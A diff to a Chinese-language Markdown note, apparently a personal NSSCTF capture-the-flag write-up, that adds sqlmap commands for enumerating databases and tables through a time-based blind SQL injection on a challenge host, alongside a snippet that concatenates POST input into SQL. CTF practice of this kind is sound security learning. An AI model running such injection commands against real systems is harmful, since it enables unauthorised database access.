@@ -12,7 +12,7 @@ tags:
   - NSSCTF
   - 五题积累
 created: 2026-03-15T16:49
-updated: 2026-05-12T13:51
+updated: 2026-05-12T13:54
 ---
 
 # 第一轮
@@ -834,8 +834,20 @@ $sql = "select " . $_POST['输入内容'] . " || flag from Flag";
 SQL注入  布尔盲注  时间盲注
 ![](NSSCTF五题积累（七）/file-20260512134028249.png)
 id是参数。使用sqlmap。
+
+```
+sqlmap -u "http://node5.anna.nssctf.cn:25436/?id=1"
+```
+
 ![](NSSCTF五题积累（七）/file-20260512134940026.png)
 时间盲注。
 ![](NSSCTF五题积累（七）/file-20260512135042024.png)
-
+```
+sqlmap -u "http://node5.anna.nssctf.cn:25436/?id=1" --dbs
+```
 ![](NSSCTF五题积累（七）/file-20260512135000546.png)
+```
+sqlmap -u "http://node5.anna.nssctf.cn:25436/?id=1" -D ctf --tables
+```
+输出一下内容。因为是时间盲注，需要一点时间。
+![](NSSCTF五题积累（七）/file-20260512135438504.png)
